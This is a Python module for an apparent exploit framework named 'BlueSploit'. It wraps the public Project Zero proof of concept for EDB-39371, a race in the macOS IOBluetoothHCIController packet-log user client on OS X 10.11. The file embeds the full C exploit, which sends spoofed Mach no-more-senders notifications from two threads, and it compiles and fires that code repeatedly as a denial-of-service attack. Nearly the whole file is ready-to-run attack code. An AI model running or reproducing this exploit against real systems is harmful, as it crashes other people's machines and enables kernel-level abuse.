"""
BlueSploit Module: macOS IOBluetoothHCIPacketLogUserClient OSArray Race
EDB-ID: 39371  (Project Zero issue 572 — ianbeer)
OS X 10.11 (El Capitan)

Original C PoC embedded verbatim; compiled and run at module execution time.
The PoC self-loops via fork+exec recommendation in the original; here we
launch it `iterations` times in a row from Python.
"""

from core.base import (
    DosModule, ModuleInfo, ModuleOption,
    BTProtocol, Severity,
)
from core.utils.printer import print_error, print_info, print_warning, Colors
from core.utils.c_runner import compile_and_run, find_compiler
from core.utils.iokit import is_macos


C_SOURCE = r"""
#include <stdio.h>
#include <stdlib.h>
#include <mach/mach.h>
#include <mach/thread_act.h>
#include <pthread.h>
#include <unistd.h>
#include <IOKit/IOKitLib.h>

io_connect_t conn = MACH_PORT_NULL;
int start = 0;

struct spoofed_notification {
  mach_msg_header_t header;
  NDR_record_t NDR;
  mach_msg_type_number_t no_senders_count;
};
struct spoofed_notification msg = {0};

void send_message(void) {
  mach_msg(&msg, MACH_SEND_MSG, msg.header.msgh_size, 0,
           MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
}

void *go(void *arg) {
  while(start == 0){;}
  usleep(1);
  send_message();
  return NULL;
}

int main(int argc, char** argv) {
  char* service_name = "IOBluetoothHCIController";
  int client_type = 1;
  io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
                          IOServiceMatching(service_name));
  if (service == MACH_PORT_NULL) { printf("no service\n"); return 0; }
  IOServiceOpen(service, mach_task_self(), client_type, &conn);
  if (conn == MACH_PORT_NULL) { printf("no conn\n"); return 0; }

  pthread_t t;
  int arg = 0;
  pthread_create(&t, NULL, go, (void*) &arg);

  msg.header.msgh_size = sizeof(struct spoofed_notification);
  msg.header.msgh_local_port = conn;
  msg.header.msgh_remote_port = conn;
  msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_COPY_SEND);
  msg.header.msgh_id = 0106;
  msg.no_senders_count = 1000;

  usleep(100000);
  start = 1;
  send_message();
  pthread_join(t, NULL);
  return 0;
}
"""


class Module(DosModule):
    info = ModuleInfo(
        name="dos/macos_iobt_packetlog_race",
        description="macOS PacketLog OSArray no-more-senders race (EDB-39371, native C)",
        author=["ianbeer (Project Zero)"],
        protocol=BTProtocol.CLASSIC,
        severity=Severity.HIGH,
        references=[
            "https://www.exploit-db.com/exploits/39371",
            "https://bugs.chromium.org/p/project-zero/issues/detail?id=572",
        ],
    )

    def _setup_options(self) -> None:
        self.options = {
            "iterations": ModuleOption(
                name="iterations", required=False, default=200,
                description="How many race attempts to fire (PoC says: while true)",
            ),
        }

    def run(self) -> bool:
        C = Colors
        iters = int(self.get_option("iterations"))
        print(f"\n  {C.RED}{'─'*55}{C.RESET}")
        print(f"  {C.BOLD}macOS PacketLog OSArray Race (EDB-39371){C.RESET}")
        print(f"  {C.RED}{'─'*55}{C.RESET}")
        if not is_macos():
            print_error("macOS only")
            return False
        if not find_compiler():
            print_error("No C compiler — install Xcode CLI tools")
            return False
        print_warning(f"Looping race PoC × {iters}")

        last_rc = -1
        for i in range(iters):
            rc, out, err = compile_and_run(
                C_SOURCE, "iobt_packetlog_race",
                ldflags=["-framework", "IOKit"],
            )
            last_rc = rc
            if rc == -1:
                print_error(err.strip())
                return False
            if i % 20 == 0:
                print_info(f"[{i+1}/{iters}] rc={rc} {out.strip()[:60]}")

        self.add_result({"edb_id": 39371, "iterations": iters, "last_rc": last_rc})
        return True
